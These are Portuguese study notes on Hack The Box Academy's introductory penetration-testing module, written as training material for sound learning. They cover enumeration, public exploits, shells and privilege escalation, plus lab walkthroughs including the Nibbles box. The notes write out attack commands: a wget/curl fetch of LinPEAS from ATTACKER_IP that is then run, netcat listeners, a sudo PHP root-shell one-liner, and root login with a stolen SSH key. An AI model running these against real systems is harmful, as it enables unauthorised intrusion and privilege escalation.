# Getting Started — Hack The Box Academy
> Anotações finais completas do módulo  
> **Path:** Penetration Tester Job Role Path  
> **Categoria:** Regular / Offensive  
> **Nível:** Fundamental / Tier 1  
> **Seções:** 23  
> **Exercícios interativos:** 8  
> **Status:** Concluído

## Visão geral do módulo

### Descrição do módulo
Este módulo cobre os fundamentos de testes de invasão e uma introdução à Hack The Box. Ele faz um walkthrough passo a passo da primeira box, explica a resolução de problemas e mostra como ter sucesso ao começar na área. Ao longo do módulo, são abordados:

- visão geral de segurança da informação
- distros de pentest
- termos e tecnologias comuns
- fundamentos de scanning e enumeração
- uso de exploits públicos
- shells, privilege escalation e transferência de arquivos
- navegação na plataforma HTB
- walkthrough passo a passo da primeira box HTB
- armadilhas comuns e como pedir ajuda
- conclusão de uma box sem walkthrough
- próximos passos na área

### Resumo do módulo
O módulo introduz os conceitos centrais de pentest e o ecossistema da HTB, com foco em construir base prática. A proposta não é apenas mostrar comandos, mas ensinar um fluxo de trabalho: enumerar, interpretar, atacar, estabilizar o acesso, escalar privilégios, documentar e continuar evoluindo.

### Pré-requisitos recomendados
- Introduction to Networking
- Linux Fundamentals
- Introduction to Web Applications
- Web Requests
- Learning Process

---

# Objetivos de aprendizagem

Ao concluir este módulo, o aluno deve ser capaz de:

1. Entender o papel do pentester dentro da segurança da informação.
2. Diferenciar vulnerability assessment de penetration testing.
3. Configurar um ambiente de trabalho básico para pentest.
4. Conectar-se ao ambiente HTB via VPN e validar a conectividade.
5. Enumerar serviços e aplicações web de forma inicial.
6. Buscar exploits públicos relevantes e validá-los.
7. Obter shells reversas e bind shells e melhorar a interatividade do terminal.
8. Identificar vetores comuns de privilege escalation.
9. Transferir arquivos entre a máquina atacante e o alvo.
10. Navegar pela plataforma HTB com propósito.
11. Resolver a box Nibbles seguindo um fluxo metodológico.
12. Consolidar uma base suficiente para avançar para retired boxes, live boxes e novos módulos.

---

# Filosofia prática do módulo

O módulo trabalha com dois eixos ao mesmo tempo:

- **aprendizado guiado**, em que os conceitos são ensinados passo a passo;
- **aprendizado exploratório**, em que o aluno precisa repetir o método e construir autonomia.

A grande ideia é que a resolução de uma box não importa apenas pelo resultado final. O valor real está em:

- montar um processo repetível;
- aprender a observar pistas;
- organizar informação;
- saber quando aprofundar enumeração;
- e transformar cada descoberta em uma hipótese de ataque.

---

# Estrutura completa por seção

## 1. Infosec Overview

### Ideia central
Segurança da informação é muito maior do que pentest. O módulo abriu contextualizando o papel do pentester dentro do universo mais amplo de infosec.

### Pontos principais
- A tríade **CIA** é o núcleo da segurança da informação:
  - **Confidentiality**
  - **Integrity**
  - **Availability**
- O processo de **risk management** envolve:
  1. identificar riscos
  2. analisar riscos
  3. avaliar riscos
  4. tratar riscos
  5. monitorar riscos
- **Red Team** e **Blue Team** representam lados diferentes da defesa:
  - o Red Team tenta simular o atacante;
  - o Blue Team protege, monitora e responde.
- O pentester ajuda a descobrir riscos técnicos reais antes que atacantes os descubram.

### O que precisa ficar
Pentest é uma disciplina ofensiva inserida dentro de um objetivo maior: reduzir risco para o negócio.

---

## 2. Getting Started with a Pentest Distro

### Ideia central
Antes de atacar qualquer coisa, o profissional precisa de um ambiente de trabalho estável, isolado e reproduzível.

### Pontos principais
- O uso de uma distro de pentest padroniza ferramentas e fluxo.
- O ideal é trabalhar em uma **VM limpa**, evitando contaminação entre ambientes.
- O módulo apresentou o uso de **Parrot OS / Pwnbox**.
- Foram explicados dois formatos comuns de distribuição:
  - **ISO**
  - **OVA**
- O conceito de **hypervisor** foi introduzido:
  - VirtualBox
  - VMware Workstation
  - Proxmox
  - VMware ESXi

### O que precisa ficar
A máquina atacante é parte da metodologia. Ambientes limpos, isolados e padronizados tornam a operação mais segura e previsível.

---

## 3. Staying Organized

### Ideia central
Documentação e organização não são acessórios; são parte do trabalho técnico.

### Pontos principais
- Foi sugerida uma estrutura de diretórios por cliente/projeto/escopo.
- Exemplos de pastas úteis:
  - `evidence`
  - `credentials`
  - `screenshots`
  - `logs`
  - `scans`
  - `scope`
  - `tools`
- Ferramentas de anotação citadas:
  - CherryTree
  - Visual Studio Code
  - Evernote
  - Notion
  - GitBook
  - Sublime Text
  - Notepad++
- A ideia de manter uma base de conhecimento própria apareceu cedo no módulo.

### O que precisa ficar
Quem se organiza melhor enumera melhor, reproduz melhor e reporta melhor.

---

## 4. Connecting Using VPN

### Ideia central
Acesso ao ambiente HTB depende de conectividade correta com a VPN.

### Pontos principais
- Foi explicado o papel de uma **VPN** como rede privada virtual.
- O módulo mostrou o uso de:
  - `openvpn user.ovpn`
- Formas de validar a conexão:
  - observar `Initialization Sequence Completed`
  - checar a interface `tun0` com `ifconfig` ou `ip a`
  - validar rotas com `netstat -rn`
- Também foram abordadas:
  - escolha de região
  - problemas com mais de um dispositivo conectado
  - troubleshooting básico

### O que precisa ficar
Antes de perder tempo depurando “falhas do alvo”, confirme sempre conectividade, rota e IP de VPN.

---

## 5. Common Terms

### Ideia central
O módulo alinhou terminologia para evitar que o aluno fique perdido ao longo do path.

### Pontos principais

#### Shell
- Interface de interação com o sistema operacional.
- Pode significar tanto o programa (bash, sh, PowerShell) quanto o acesso obtido no alvo.

#### Port
- Portas representam pontos de acesso a serviços.
- Exemplos clássicos:
  - 21 FTP
  - 22 SSH
  - 23 Telnet
  - 25 SMTP
  - 80 HTTP
  - 161 SNMP
  - 389 LDAP
  - 443 HTTPS
  - 445 SMB
  - 3389 RDP

#### Web Server
- Serviços que recebem tráfego HTTP/HTTPS e entregam aplicações web.
- O módulo citou a importância do **OWASP Top 10**.

### O que precisa ficar
Entender linguagem, protocolos e portas acelera muito a leitura de scans e a priorização de ataques.

---

## 6. Basic Tools

### Ideia central
Ferramentas “básicas” sustentam quase todo o restante do trabalho.

### Pontos principais

#### SSH
- Protocolo de administração remota, normalmente na porta 22.
- Uso básico:
  ```bash
  ssh user@host
  ssh -i key user@host
  ```
- Também foi mencionado o uso para port forwarding.

#### Netcat
- Ferramenta extremamente versátil para interação com portas TCP/UDP.
- Útil para:
  - banner grabbing
  - listeners
  - shells reversas e bind shells
  - debugging simples

#### Tmux
- Multiplexador de terminal.
- Atalhos importantes:
  - `Ctrl+b c` nova janela
  - `Ctrl+b %` split vertical
  - `Ctrl+b "` split horizontal
  - `Ctrl+b` + setas para navegação

#### Vim
- Editor extremamente útil em hosts comprometidos.
- Modos principais:
  - normal
  - insert
  - command
- Comandos essenciais:
  - `i`
  - `:w`
  - `:q`
  - `:wq`
  - `:q!`

### O que precisa ficar
SSH, nc, tmux e vim aparecem o tempo inteiro. Dominar os fundamentos dessas ferramentas multiplica produtividade.

---

## 7. Service Scanning

### Ideia central
O serviço certo na porta certa, com a versão certa, muda completamente o ataque.

### Pontos principais
- O módulo apresentou o papel do **Nmap** na identificação de portas e serviços.
- Scans básicos:
  ```bash
  nmap <ip>
  nmap -sV -sC <ip>
  nmap -p- <ip>
  ```
- Foi discutido o uso de **banner grabbing**.
- Exemplo com FTP:
  - enumeração de banner
  - acesso anônimo
  - listagem de diretórios
  - download de arquivo
- Exemplo com SMB:
  - `smb-os-discovery`
  - `smbclient`
  - enumeração de shares
- Exemplo com SNMP:
  - `snmpwalk`
  - community strings públicas e privadas

### O que precisa ficar
A enumeração de serviço exige combinar:
- scan inicial
- version detection
- scripts úteis
- e interação manual com o serviço.

---

## 8. Web Enumeration

### Ideia central
Aplicações web quase sempre ampliam muito a superfície de ataque.

### Pontos principais
- Ferramentas e técnicas apresentadas:
  - `Gobuster`
  - enumeração de DNS/subdomínios
  - `curl`
  - `whatweb`
  - análise de certificados
  - leitura de `robots.txt`
  - inspeção de source code
- Foi mostrado que:
  - comentários HTML podem expor pistas;
  - `README` e arquivos default podem revelar versões;
  - `robots.txt` pode apontar áreas sensíveis;
  - painéis de admin frequentemente aparecem em diretórios previsíveis.

### O que precisa ficar
Toda porta web precisa ser tratada como ecossistema:
- diretórios
- arquivos
- tecnologias
- headers
- comentários
- conteúdo oculto
- e pontos administrativos.

---

## 9. Public Exploits

### Ideia central
Depois de identificar serviço e versão, o próximo passo é verificar se existe exploit público aplicável.

### Pontos principais
- Busca manual via Google.
- Busca local com:
  ```bash
  searchsploit <serviço ou versão>
  ```
- Introdução ao **Metasploit Framework**:
  - `msfconsole`
  - `search`
  - `use`
  - `show options`
  - `check`
  - `run` / `exploit`
- O módulo destacou que exploit público não elimina a necessidade de entendimento técnico.

### O que precisa ficar
Buscar exploit é fácil; validar se o exploit realmente se encaixa no alvo é o trabalho de verdade.

---

## 10. Types of Shells

### Ideia central
Obter código executando no alvo não basta; é preciso entender que tipo de shell foi obtida e como operar nela.

### Pontos principais

#### Reverse Shell
- O alvo conecta de volta para a máquina atacante.
- Exemplo de listener:
  ```bash
  nc -lvnp 1234
  ```

#### Bind Shell
- O alvo abre uma porta e espera que o atacante conecte.

#### Web Shell
- Script web que recebe comandos via parâmetros HTTP.
- Exemplos clássicos em PHP, JSP e ASP.

#### Melhorando interatividade
- Upgrade para pseudo-TTY:
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
- Ajustes de terminal:
  ```bash
  stty raw -echo
  fg
  export TERM=xterm-256color
  stty rows <n> columns <n>
  ```

### O que precisa ficar
A shell inicial quase nunca é a shell final. Estabilizar o acesso é parte do trabalho.

---

## 11. Privilege Escalation

### Ideia central
Compromisso inicial raramente é o objetivo final; normalmente ele é apenas ponto de partida.

### Pontos principais
- Ferramentas de enumeração:
  - **LinEnum**
  - **LinPEAS**
  - **WinPEAS**
- Vetores abordados:
  - kernel exploits
  - software vulnerável
  - privilégios sudo
  - tarefas agendadas
  - credenciais expostas
  - chaves SSH
- Exemplo importante:
  - `sudo -l`
  - permissões NOPASSWD
  - abuso de comandos permitidos

### O que precisa ficar
PrivEsc é enumeração local + interpretação. O script ajuda, mas o raciocínio fecha o caminho.

---

## 12. Transferring Files

### Ideia central
Em algum momento será necessário levar arquivos para o alvo ou trazê-los de volta.

### Pontos principais
- Download com `wget` e `curl`
- Cópia com `scp`
- Transferência via base64
- Validação com:
  - `file`
  - `md5sum`

### Exemplos úteis
```bash
python3 -m http.server 8000
wget http://ATTACKER_IP:8000/file
curl -O http://ATTACKER_IP:8000/file
scp file user@host:/tmp/file
```

### O que precisa ficar
Transferência de arquivos deve ser simples, validável e repetível.

---

## 13. Starting Out

### Ideia central
O módulo apresentou um roteiro de evolução inicial na HTB e fora dela.

### Pontos principais
- Recursos práticos para treino:
  - Juice Shop
  - Metasploitable 2
  - Metasploitable 3
  - DVWA
- Canais úteis:
  - IppSec
  - VbScrub
  - STÖK
  - LiveOverflow
- Plataformas úteis:
  - OverTheWire
  - UnderTheWire
  - tutorial sites e Starting Point
- Recomendações:
  - retired easy boxes
  - tracks
  - writeups
  - prática regular

### O que precisa ficar
Começar bem é construir volume de prática sem abandonar fundamentos.

---

## 14. Navigating HTB

### Ideia central
A plataforma HTB tem muitos componentes e cada um serve a um propósito diferente.

### Pontos principais
- **Profile**
- **Rankings**
- **Tracks**
- **Machines**:
  - active
  - retired
- **Challenges**
- **Fortress**
- **Endgame**
- **Pro Labs**
- **Battlegrounds**

### O que precisa ficar
Não basta usar a HTB de forma aleatória. Entender a plataforma ajuda a montar progressão real.

---

## 15. Nibbles - Enumeration

### Ideia central
Primeira aplicação prática do módulo em uma box real.

### Fluxo principal
- Nmap rápido
- Nmap com `-sV`, `-sC` e `--open`
- Identificação de:
  - SSH
  - HTTP
- Detecção de Nibbleblog

### O que precisa ficar
O método importa mais que o alvo. A Nibbles foi o primeiro exercício de transformar enumeração em hipótese concreta.

---

## 16. Nibbles - Web Footprinting

### Ideia central
A enumeração web foi aprofundada até chegar na versão exata do CMS e nas pistas necessárias para exploração.

### Fluxo principal
- `whatweb`
- comentário HTML apontando para `/nibbleblog/`
- `gobuster`
- leitura do `README`
- identificação da versão **4.0.3**
- acesso ao painel admin
- enumeração de diretórios e arquivos
- descoberta de `users.xml` e `config.xml`

### Pistas importantes
- usuário `admin`
- blacklist de IP por tentativas excessivas
- provável senha relacionada a “nibbles”

### O que precisa ficar
Web enum detalhada quase sempre expõe:
- versão
- painel de login
- usuário válido
- comportamento defensivo
- e caminho de exploração.

---

## 17. Nibbles - Initial Foothold

### Ideia central
Com as pistas certas, o foco passou a ser transformar login web em execução de código.

### Fluxo principal
- uso do painel autenticado do Nibbleblog
- análise do plugin **My Image**
- upload de código PHP
- confirmação de RCE
- adaptação para reverse shell
- listener com `nc`
- upgrade de TTY com `python3`

### Evidência importante
Após o foothold, foi possível localizar a `user.txt` em `/home/nibbler/`.

### O que precisa ficar
RCE via upload mal validado é uma cadeia clássica:
- credencial
- painel
- funcionalidade vulnerável
- web shell / reverse shell
- estabilização.

---

## 18. Nibbles - Privilege Escalation

### Ideia central
Do acesso como `nibbler`, a próxima etapa foi virar root.

### Fluxo principal
- extração de `personal.zip`
- descoberta de `monitor.sh`
- `sudo -l`
- permissão NOPASSWD para executar o script
- modificação do script
- execução como root
- captura da `root.txt`

### O que precisa ficar
Scripts de usuário autorizados via sudo são vetores fortíssimos, principalmente quando estão em local editável.

---

## 19. Nibbles - Alternate User Method - Metasploit

### Ideia central
A box também podia ser resolvida com Metasploit, reforçando que um mesmo alvo pode ter múltiplos caminhos.

### Fluxo principal
- `search nibbleblog`
- módulo `exploit/multi/http/nibbleblog_file_upload`
- configuração de:
  - `RHOSTS`
  - `USERNAME`
  - `PASSWORD`
  - `TARGETURI`
  - `LHOST`
  - `LPORT`
- obtenção de sessão
- shell no host

### O que precisa ficar
Saber resolver com Metasploit é útil; saber resolver sem ele continua sendo essencial.

---

## 20. Common Pitfalls

### Ideia central
Muitos erros de iniciante não são falhas técnicas complexas, mas tropeços operacionais.

### Pontos principais

#### VPN
- confirmar conexão
- verificar `tun0`
- conferir rotas
- testar gateway

#### Proxy/Burp
- lembrar de desligar proxy quando necessário
- não deixar navegador preso em configuração antiga

#### SSH
- problemas com chave e senha
- regeneração com `ssh-keygen`

### O que precisa ficar
Boa parte do troubleshooting começa em conectividade, proxy e terminal — não no alvo.

---

## 21. Getting Help

### Ideia central
Pedir ajuda bem é parte da skill.

### Pontos principais
- canais úteis:
  - fórum HTB
  - Discord HTB
  - HTB FAQ
- como formular perguntas:
  1. em que ponto você travou
  2. o que já tentou
  3. o que esperava acontecer
  4. qual erro ou comportamento observou
- como responder perguntas:
  - sem spoiler desnecessário
  - com direcionamento
  - com contexto suficiente

### O que precisa ficar
Pergunta boa acelera ajuda. Resposta boa fortalece comunidade e entendimento.

---

## 22. Next Steps

### Ideia central
O módulo termina apontando para uma progressão prática após a primeira box.

### Recomendações principais
- root em retired easy boxes
- depois retired medium
- primeira live easy
- depois live medium/hard
- continuar Academy Modules em paralelo
- manter lista de próximos módulos
- contribuir na comunidade
- escrever walkthroughs

### O que precisa ficar
Boxes e módulos devem andar juntos. Um consolida prática, o outro fecha lacunas conceituais.

---

## 23. Knowledge Check

### Ideia central
Fechamento do módulo: repetir o processo sem walkthrough.

### Pontos principais
- enumeração é iterativa
- repetir o fluxo da Nibbles
- combinar:
  - Nmap
  - whatweb
  - Gobuster
  - Searchsploit
  - enumeração local
  - LinEnum / LinPEAS
- considerar múltiplos caminhos de foothold e de PrivEsc

### O que precisa ficar
O verdadeiro check de conhecimento é autonomia.

---

# Síntese técnica do módulo

## Processo geral aprendido
O módulo inteiro, na prática, construiu esta cadeia:

1. validar conectividade
2. enumerar portas e serviços
3. identificar tecnologias
4. procurar versões e pistas
5. buscar exploit público ou explorar manualmente
6. obter foothold
7. melhorar a shell
8. enumerar localmente
9. escalar privilégios
10. coletar evidências
11. documentar
12. repetir em novos alvos

## Ferramentas centrais trabalhadas
- Nmap
- Gobuster
- WhatWeb
- Curl
- Searchsploit
- Metasploit
- Netcat
- SSH
- Tmux
- Vim
- LinEnum
- LinPEAS
- wget / curl / scp
- base64

## Hábitos corretos reforçados pelo módulo
- salvar scans
- documentar tudo
- sempre confirmar versão e tecnologia
- não confiar em um único scan
- verificar enumeração web com profundidade
- melhorar shell logo após foothold
- rodar enumeração local manual + automatizada
- pensar em mais de um caminho possível
- não depender de walkthrough cedo demais

---

# Cheat sheet operacional do módulo

## Nmap
```bash
nmap <ip>
nmap -sV -sC <ip>
nmap -p- <ip>
nmap --top-ports=10 <ip>
nmap -sV --script vuln <ip>
```

## Web enum
```bash
whatweb http://target
gobuster dir -u http://target -w /usr/share/dirb/wordlists/common.txt
curl -I http://target
curl http://target/robots.txt
```

## Searchsploit
```bash
searchsploit wordpress 5.6.1
searchsploit nibbleblog
searchsploit -m <id>
```

## Shells
```bash
nc -lvnp 1234
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
fg
export TERM=xterm-256color
```

## LinPEAS / LinEnum
```bash
curl -LO http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
sudo -l
```

## Transferência de arquivos
```bash
python3 -m http.server 8000
wget http://ATTACKER_IP:8000/file
curl -O http://ATTACKER_IP:8000/file
scp file user@host:/tmp/file
```

---

# Hands-on resolvidos no módulo

> **Nota para publicação no GitHub:** esta seção descreve os caminhos de resolução e os aprendizados práticos, mas evita expor flags em claro. Para backup privado, use a versão detalhada com evidências completas.

## 1. Enumeração SMB com senha fraca do usuário bob
### Situação
O alvo expunha:
- FTP anônimo
- SSH
- HTTP
- SMB
- Telnet
- Tomcat

### Fluxo executado
- enumeração SMB via null session
- enumeração RPC para descobrir usuários
- acesso FTP anônimo
- download de `login.txt`
- descoberta posterior, pelo próprio enunciado/módulo, da credencial fraca do usuário `bob`
- conexão ao share `users`
- navegação até `flag/flag.txt`

### Aprendizados
- null session pode permitir muita enumeração mesmo sem autenticação;
- hints e textos do módulo importam;
- share com `mapping OK` mas `listing denied` pode mudar totalmente com credencial válida.

---

## 2. Web enumeration com `robots.txt` e comentário HTML
### Situação
O exercício pedia aplicar técnicas de enumeração web e “Everything you need to login is given to you”.

### Fluxo executado
- `gobuster dir`
- descoberta de `robots.txt`
- leitura de `/admin-login-page.php`
- inspeção do HTML
- descoberta do comentário:
  `admin:password123`
- login e captura da flag no painel autenticado

### Aprendizados
- `robots.txt` é uma pista muito frequente;
- comentários HTML continuam sendo vazamento clássico;
- enumeração simples resolve muitos labs introdutórios.

---

## 3. WordPress + plugin vulnerável + leitura de arquivo
### Situação
O alvo expunha WordPress. A dica era procurar exploit de plugin.

### Fluxo executado
- `nmap -sC -sV`
- identificação de WordPress 5.6.1
- busca de exploit no Metasploit
- uso do módulo:
  `wp_simple_backup_file_read`
- leitura de `/flag.txt`

### Aprendizados
- identificar CMS e plugin é tão importante quanto identificar o servidor web;
- file read é um ótimo exemplo de exploit sem RCE, mas ainda útil para recuperar segredos.

---

## 4. Movimento lateral de `user1` para `user2`
### Situação
O lab fornecia acesso SSH a `user1` e pedia chegar a `user2`.

### Fluxo executado
- login via SSH com porta customizada
- `sudo -l`
- descoberta de:
  ```text
  (user2 : user2) NOPASSWD: /bin/bash
  ```
- troca para `user2` com:
  ```bash
  sudo -u user2 /bin/bash
  ```
- leitura de `/home/user2/flag.txt`

### Aprendizados
- `sudo -l` é obrigatório cedo na enumeração local;
- lateral movement local também é privilege escalation em escopo de usuários.

---

## 5. Escalada de `user2` para root com chave SSH privada
### Situação
Após chegar a `user2`, o objetivo era virar root.

### Fluxo executado
- leitura de `/root/.ssh/id_rsa`
- cópia da chave para a máquina atacante
- ajuste de permissões:
  ```bash
  chmod 600 id_rsa
  ```
- login como root:
  ```bash
  ssh root@HOST -p PORT -i id_rsa
  ```
- captura de `/root/flag.txt`

### Aprendizados
- chaves privadas expostas são comprometimento crítico;
- a dica “Don’t forget to chmod” era literalmente operacional.

---

## 6. Identificação da versão do Apache com Nmap
### Situação
O exercício pedia apenas a versão do Apache obtida no script scan.

### Fluxo executado
- `nmap -sCV -p- -vvv`
- leitura do campo:
  `Apache httpd 2.4.18 ((Ubuntu))`

### Aprendizados
- às vezes a resposta já está no output;
- é preciso ler cuidadosamente o local correto do resultado.

---

## 7. Nibbles - foothold
### Situação
O alvo era a box Nibbles, pedindo foothold e `user.txt`.

### Fluxo executado
- Nmap
- descoberta de `/nibbleblog/`
- leitura do `README`
- confirmação de versão 4.0.3
- uso do exploit do Metasploit:
  `nibbleblog_file_upload`
- reverse shell
- upgrade de TTY
- leitura de `/home/nibbler/user.txt`

### Aprendizados
- CMS versionado + painel admin + plugin = superfície clássica;
- Metasploit acelera, mas o entendimento do fluxo continua necessário.

---

## 8. Nibbles - privilege escalation
### Situação
Depois do foothold, o objetivo era virar root.

### Fluxo executado
- `sudo -l`
- descoberta de:
  ```text
  (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
  ```
- extração de `personal.zip`
- sobrescrita do `monitor.sh` com payload local
- `chmod +x`
- execução via sudo
- shell root e leitura de `/root/root.txt`

### Aprendizados
- scripts editáveis autorizados por sudo são vetor extremamente forte;
- sempre testar privilégios sudo cedo.

---

## 9. Alvo final do módulo - foothold e root
### Situação
O exercício final pedia foothold e depois escalada para root.

### Fluxo executado
- exploração da aplicação web
- reverse shell como `www-data`
- upgrade de shell
- identificação de `user.txt`
- upload e execução de `linpeas.sh`
- descoberta via `sudo -l` de:
  ```text
  (ALL : ALL) NOPASSWD: /usr/bin/php
  ```
- abuso com:
  ```bash
  sudo /usr/bin/php -r 'system("/bin/sh -i");'
  ```
- shell root
- leitura de `/root/root.txt`

### Aprendizados
- `www-data` com sudo mal configurado encerra o desafio rapidamente;
- mesmo em labs introdutórios, LinPEAS acelera a confirmação do vetor correto.

---

# Lições mais importantes do hands-on

## 1. Enumeração vence pressa
Nos exercícios práticos, as respostas quase sempre surgiram de:
- leitura cuidadosa do output;
- enumeração de diretórios;
- revisão do source;
- ou enumeração local após foothold.

## 2. Credenciais fracas aparecem de formas diferentes
Elas podem vir de:
- arquivos esquecidos em FTP;
- comentários HTML;
- nomes relacionados à aplicação;
- reuso de senha;
- arquivos de configuração;
- scripts e backups.

## 3. `sudo -l` é obrigatório
Em múltiplos labs, o vetor de escalada dependia diretamente de `sudo -l`.

## 4. Shell interativa melhor = menos erro
Quase todo foothold melhora depois do upgrade com `python3 pty`.

## 5. Metasploit é útil, mas não substitui método
Foi usado em alguns pontos, mas sempre apoiado por enumeração correta.

---

# Mapa mental final do módulo

## Antes do alvo
- preparar VM
- organizar diretórios
- conectar VPN
- validar rota

## Durante enumeração
- Nmap
- version detection
- enum web
- leitura de arquivos públicos
- fingerprint de tecnologia
- busca de exploit

## Após foothold
- melhorar shell
- enumerar local
- checar `sudo -l`
- procurar credenciais, scripts, arquivos, tarefas, chaves

## Após root
- capturar evidência
- documentar caminho
- comparar método com solução oficial
- repetir em outro alvo

---

# Conclusão final do módulo

**Getting Started** é um módulo introdutório só no nome. Na prática, ele estabelece quase todo o esqueleto operacional que reaparece no restante do path:

- preparação de ambiente
- conexão ao laboratório
- enumeração de serviços
- enumeração web
- busca de exploit público
- obtenção de shell
- estabilização do acesso
- privilege escalation
- documentação
- troubleshooting
- navegação na HTB
- progressão após a primeira box

O maior valor do módulo é que ele não ensina apenas “o que digitar”, mas **como pensar**:

- observar pistas pequenas;
- voltar à enumeração sempre que necessário;
- transformar informação em hipótese;
- validar a hipótese com calma;
- e manter o trabalho organizado do início ao fim.

Em resumo: este módulo constrói a base mental e operacional para começar a resolver boxes com autonomia crescente.

---

# Próximos passos recomendados

Com base no próprio módulo, a progressão ideal após este fechamento é:

1. resolver mais retired easy boxes
2. revisar anotações e comparar com writeups
3. continuar módulos fundamentais da Academy em paralelo
4. repetir exercícios sem olhar o passo a passo
5. começar a escrever walkthroughs técnicos
6. avançar gradualmente para retired medium e live easy boxes

---

# Fechamento pessoal do progresso neste módulo

Neste módulo, foram concluídas todas as 23 seções e também os exercícios hands-on associados, incluindo enumeração de serviços, enumeração web, exploração com e sem Metasploit, uso de shells, privilege escalation, movimentação lateral entre usuários e captura de flags em labs guiados. O PDF de recorte com o hands-on mostra esse percurso prático completo, incluindo a resolução dos exercícios de SMB, web enum, WordPress/Nibbleblog, SSH, privilege escalation e o alvo final do módulo. 

